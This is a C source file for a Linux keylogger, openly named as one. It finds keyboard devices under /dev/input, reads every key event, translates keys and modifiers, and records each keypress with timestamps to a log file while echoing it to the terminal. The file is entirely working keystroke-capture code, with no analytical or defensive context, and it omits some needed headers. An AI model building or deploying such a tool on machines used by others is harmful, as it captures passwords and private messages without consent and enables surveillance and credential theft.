#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#ifdef __linux__
#include <linux/input.h>
#endif
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <dirent.h>

#ifdef __linux__
#define MAX_DEVICES 10
#define LOG_BUFFER_SIZE 1024

// Bit manipulation macros for input device testing
#define NBITS(x) ((((x)-1)/BITS_PER_LONG)+1)
#define OFF(x)  ((x)%BITS_PER_LONG)
#define BIT(x)  (1UL<<OFF(x))
#define LONG(x) ((x)/BITS_PER_LONG)
#define test_bit(bit, array)    ((array[LONG(bit)] >> OFF(bit)) & 1)

#ifndef BITS_PER_LONG
#define BITS_PER_LONG (sizeof(long) * 8)
#endif

volatile int logging = 1;

// Key mapping for common keys
const char* key_names[] = {
    [KEY_RESERVED] = "", [KEY_ESC] = "[ESC]", [KEY_1] = "1", [KEY_2] = "2",
    [KEY_3] = "3", [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
    [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_BACKSPACE] = "[BACKSPACE]",
    [KEY_TAB] = "[TAB]", [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e",
    [KEY_R] = "r", [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u",
    [KEY_I] = "i", [KEY_O] = "o", [KEY_P] = "p", [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]", [KEY_ENTER] = "\n", [KEY_LEFTCTRL] = "[CTRL]",
    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_J] = "j", [KEY_K] = "k",
    [KEY_L] = "l", [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`", [KEY_LEFTSHIFT] = "[SHIFT]", [KEY_BACKSLASH] = "\\",
    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c", [KEY_V] = "v",
    [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m", [KEY_COMMA] = ",",
    [KEY_DOT] = ".", [KEY_SLASH] = "/", [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_KPASTERISK] = "*", [KEY_LEFTALT] = "[ALT]", [KEY_SPACE] = " ",
    [KEY_CAPSLOCK] = "[CAPS]", [KEY_F1] = "[F1]", [KEY_F2] = "[F2]",
    [KEY_F3] = "[F3]", [KEY_F4] = "[F4]", [KEY_F5] = "[F5]",
    [KEY_F6] = "[F6]", [KEY_F7] = "[F7]", [KEY_F8] = "[F8]",
    [KEY_F9] = "[F9]", [KEY_F10] = "[F10]", [KEY_NUMLOCK] = "[NUMLOCK]",
    [KEY_SCROLLLOCK] = "[SCROLLLOCK]", [KEY_KP7] = "7", [KEY_KP8] = "8",
    [KEY_KP9] = "9", [KEY_KPMINUS] = "-", [KEY_KP4] = "4",
    [KEY_KP5] = "5", [KEY_KP6] = "6", [KEY_KPPLUS] = "+",
    [KEY_KP1] = "1", [KEY_KP2] = "2", [KEY_KP3] = "3",
    [KEY_KP0] = "0", [KEY_KPDOT] = ".", [KEY_F11] = "[F11]",
    [KEY_F12] = "[F12]", [KEY_KPENTER] = "\n", [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_KPSLASH] = "/", [KEY_SYSRQ] = "[SYSRQ]", [KEY_RIGHTALT] = "[ALT]",
    [KEY_HOME] = "[HOME]", [KEY_UP] = "[UP]", [KEY_PAGEUP] = "[PGUP]",
    [KEY_LEFT] = "[LEFT]", [KEY_RIGHT] = "[RIGHT]", [KEY_END] = "[END]",
    [KEY_DOWN] = "[DOWN]", [KEY_PAGEDOWN] = "[PGDN]", [KEY_INSERT] = "[INS]",
    [KEY_DELETE] = "[DEL]"
};

void signal_handler(int sig) {
    logging = 0;
}

int is_keyboard_device(const char* device_path) {
    int fd;
    unsigned long bit[EV_MAX][NBITS(KEY_MAX)];
    
    fd = open(device_path, O_RDONLY);
    if (fd < 0) return 0;
    
    memset(bit, 0, sizeof(bit));
    ioctl(fd, EVIOCGBIT(0, EV_MAX), bit[0]);
    close(fd);
    
    // Check if device supports key events
    return test_bit(EV_KEY, bit[0]);
}

void find_keyboard_devices(char devices[][256], int* device_count) {
    DIR *input_dir;
    struct dirent *entry;
    char device_path[256];
    
    *device_count = 0;
    
    input_dir = opendir("/dev/input");
    if (!input_dir) {
        fprintf(stderr, "Error: Cannot open /dev/input directory\n");
        return;
    }
    
    while ((entry = readdir(input_dir)) != NULL && *device_count < MAX_DEVICES) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            
            if (is_keyboard_device(device_path)) {
                strcpy(devices[*device_count], device_path);
                (*device_count)++;
                printf("Found keyboard device: %s\n", device_path);
            }
        }
    }
    
    closedir(input_dir);
}

const char* get_key_name(int key_code, int shift_pressed) {
    if (key_code >= 0 && key_code < (int)(sizeof(key_names)/sizeof(key_names[0])) && key_names[key_code]) {
        const char* base_key = key_names[key_code];
        
        // Handle shifted characters
        if (shift_pressed && strlen(base_key) == 1) {
            char c = base_key[0];
            static char shifted_key[2] = {0};
            
            if (c >= 'a' && c <= 'z') {
                shifted_key[0] = c - 'a' + 'A';
                return shifted_key;
            }
            
            // Handle shifted number row
            switch (c) {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
                case '-': return "_";
                case '=': return "+";
                case '[': return "{";
                case ']': return "}";
                case '\\': return "|";
                case ';': return ":";
                case '\'': return "\"";
                case '`': return "~";
                case ',': return "<";
                case '.': return ">";
                case '/': return "?";
            }
        }
        
        return base_key;
    }
    
    static char unknown_key[16];
    snprintf(unknown_key, sizeof(unknown_key), "[KEY_%d]", key_code);
    return unknown_key;
}

int main(int argc, char *argv[]) {
    char keyboard_devices[MAX_DEVICES][256];
    int device_count = 0;
    int device_fds[MAX_DEVICES];
    struct input_event event;
    fd_set readfds;
    char log_filename[256];
    FILE *log_file;
    time_t start_time;
    int shift_pressed = 0;
    int ctrl_pressed = 0;
    int alt_pressed = 0;
    int duration = 0; // 0 = infinite
    
    // Parse command line arguments
    if (argc > 1) {
        duration = atoi(argv[1]);
    }
    
    // Generate log filename with timestamp
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    snprintf(log_filename, sizeof(log_filename), "keylog_%04d%02d%02d_%02d%02d%02d.txt",
             timeinfo->tm_year + 1900, timeinfo->tm_mon + 1, timeinfo->tm_mday,
             timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
    
    printf("Keylogger starting...\n");
    printf("Log file: %s\n", log_filename);
    if (duration > 0) {
        printf("Duration: %d seconds\n", duration);
    } else {
        printf("Duration: unlimited (press Ctrl+C to stop)\n");
    }
    
    // Find keyboard devices
    find_keyboard_devices(keyboard_devices, &device_count);
    
    if (device_count == 0) {
        fprintf(stderr, "Error: No keyboard devices found\n");
        fprintf(stderr, "Try running as root or check /dev/input permissions\n");
        return 1;
    }
    
    // Open keyboard devices
    for (int i = 0; i < device_count; i++) {
        device_fds[i] = open(keyboard_devices[i], O_RDONLY | O_NONBLOCK);
        if (device_fds[i] < 0) {
            fprintf(stderr, "Warning: Cannot open %s: %s\n", 
                    keyboard_devices[i], strerror(errno));
            device_fds[i] = -1;
        }
    }
    
    // Open log file
    log_file = fopen(log_filename, "w");
    if (!log_file) {
        fprintf(stderr, "Error: Cannot create log file\n");
        return 1;
    }
    
    // Write log header
    fprintf(log_file, "=== Keylogger Session Started ===\n");
    fprintf(log_file, "Timestamp: %s", ctime(&rawtime));
    fprintf(log_file, "Devices: ");
    for (int i = 0; i < device_count; i++) {
        if (device_fds[i] >= 0) {
            fprintf(log_file, "%s ", keyboard_devices[i]);
        }
    }
    fprintf(log_file, "\n");
    fprintf(log_file, "=====================================\n\n");
    fflush(log_file);
    
    // Set up signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    printf("Keylogging started. Press Ctrl+C to stop.\n");
    time(&start_time);
    
    // Main logging loop
    while (logging) {
        // Check duration
        if (duration > 0) {
            time_t current_time;
            time(&current_time);
            if (current_time - start_time >= duration) {
                break;
            }
        }
        
        // Set up file descriptor set
        FD_ZERO(&readfds);
        int max_fd = -1;
        
        for (int i = 0; i < device_count; i++) {
            if (device_fds[i] >= 0) {
                FD_SET(device_fds[i], &readfds);
                if (device_fds[i] > max_fd) {
                    max_fd = device_fds[i];
                }
            }
        }
        
        if (max_fd == -1) {
            fprintf(stderr, "No valid keyboard devices available\n");
            break;
        }
        
        // Wait for input with timeout
        struct timeval timeout = {1, 0}; // 1 second timeout
        int result = select(max_fd + 1, &readfds, NULL, NULL, &timeout);
        
        if (result < 0) {
            if (errno == EINTR) continue;
            fprintf(stderr, "Error in select(): %s\n", strerror(errno));
            break;
        }
        
        if (result == 0) continue; // Timeout
        
        // Check each device for input
        for (int i = 0; i < device_count; i++) {
            if (device_fds[i] >= 0 && FD_ISSET(device_fds[i], &readfds)) {
                ssize_t bytes = read(device_fds[i], &event, sizeof(event));
                
                if (bytes == sizeof(event)) {
                    // Only process key events
                    if (event.type == EV_KEY) {
                        // Track modifier keys
                        if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                            shift_pressed = (event.value == 1);
                            continue;
                        }
                        if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            ctrl_pressed = (event.value == 1);
                            continue;
                        }
                        if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                            alt_pressed = (event.value == 1);
                            continue;
                        }
                        
                        // Only log key press events (not release)
                        if (event.value == 1) {
                            const char* key_str = get_key_name(event.code, shift_pressed);
                            
                            // Add timestamp for special keys or new lines
                            if (strstr(key_str, "[") || strcmp(key_str, "\n") == 0) {
                                time_t now;
                                time(&now);
                                struct tm *tm_info = localtime(&now);
                                fprintf(log_file, " [%02d:%02d:%02d] ", 
                                        tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec);
                            }
                            
                            // Log the key
                            fprintf(log_file, "%s", key_str);
                            
                            // Add modifier indicators for special combinations
                            if (ctrl_pressed && alt_pressed) {
                                fprintf(log_file, "[CTRL+ALT]");
                            } else if (ctrl_pressed) {
                                fprintf(log_file, "[CTRL]");
                            } else if (alt_pressed) {
                                fprintf(log_file, "[ALT]");
                            }
                            
                            fflush(log_file);
                            
                            // Also print to stdout for real-time monitoring
                            printf("%s", key_str);
                            fflush(stdout);
                        }
                    }
                }
            }
        }
    }
    
    // Cleanup
    fprintf(log_file, "\n\n=== Keylogger Session Ended ===\n");
    time_t end_time;
    time(&end_time);
    fprintf(log_file, "End time: %s", ctime(&end_time));
    fprintf(log_file, "Duration: %ld seconds\n", end_time - start_time);
    
    fclose(log_file);
    
    for (int i = 0; i < device_count; i++) {
        if (device_fds[i] >= 0) {
            close(device_fds[i]);
        }
    }
    
    printf("\nKeylogging completed. Log saved to: %s\n", log_filename);
    
    return 0;
}
#else
int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;
    fprintf(stderr, "Error: This module is Linux-only\n");
    return 1;
}
#endif